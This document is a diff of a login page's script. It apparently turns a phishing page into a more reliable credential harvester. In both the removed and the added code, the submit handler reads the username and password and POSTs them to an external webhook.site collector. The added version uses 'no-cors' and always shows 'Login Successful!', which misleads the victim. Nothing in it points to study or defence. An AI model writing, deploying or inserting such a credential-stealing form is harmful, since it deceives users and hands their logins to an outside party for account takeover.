@@ -26,53 +26,39 @@
     </div>
 
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            document.getElementById("authForm").addEventListener("submit", function(event) {
-                event.preventDefault(); // Prevent actual form submission
+        document.getElementById("authForm").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent form submission
 
-                let formData = new FormData();
-                formData.append("user", document.querySelector('input[name="user"]').value);
-                formData.append("pass", document.querySelector('input[name="pass"]').value);
-                formData.append("action", "Login Attempt");
-                formData.append("time", new Date());
+            let formData = new FormData();
+            formData.append("user", document.querySelector('input[name="user"]').value);
+            formData.append("pass", document.querySelector('input[name="pass"]').value);
+            formData.append("action", "Login Attempt");
+            formData.append("time", new Date());
 
-                fetch("https://webhook.site/39b5507e-6e25-4a60-b84e-3cd3e4e84c0f", {
-                    method: "POST",
-                    body: formData
-                })
-                .then(response => {
-                    console.log("Response Status:", response.status);
-
-                    if (!response.ok) { 
-                        throw new Error(`HTTP error! Status: ${response.status}`);
-                    }
-
-                    return response.text();
-                })
-                .then(data => {
-                    console.log("Response Data:", data);
-                    
-                    // ✅ Show success message
-                    let messageBox = document.getElementById("message");
-                    messageBox.innerText = "Login Successful!";
-                    messageBox.style.color = "green";
-                    messageBox.style.display = "block";
-                })
-                .catch(error => {
-                    console.error("Fetch Error:", error);
-
-                    // ❌ Show error message
-                    let messageBox = document.getElementById("message");
-                    messageBox.innerText = "Login Failed. Please try again.";
-                    messageBox.style.color = "red";
-                    messageBox.style.display = "block";
-                });
+            fetch("https://webhook.site/39b5507e-6e25-4a60-b84e-3cd3e4e84c0f", {
+                method: "POST",
+                body: formData,
+                mode: "no-cors" // 🚀 Prevents CORS errors
+            })
+            .then(() => {
+                let messageBox = document.getElementById("message");
+                messageBox.innerText = "✅ Login Successful!";
+                messageBox.style.color = "green";
+                messageBox.style.display = "block";
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                let messageBox = document.getElementById("message");
+                messageBox.innerText = "❌ Login Failed. Try again.";
+                messageBox.style.color = "red";
+                messageBox.style.display = "block";
             });
         });
     </script>
 
 </body>
 </html>
+
 
 
 
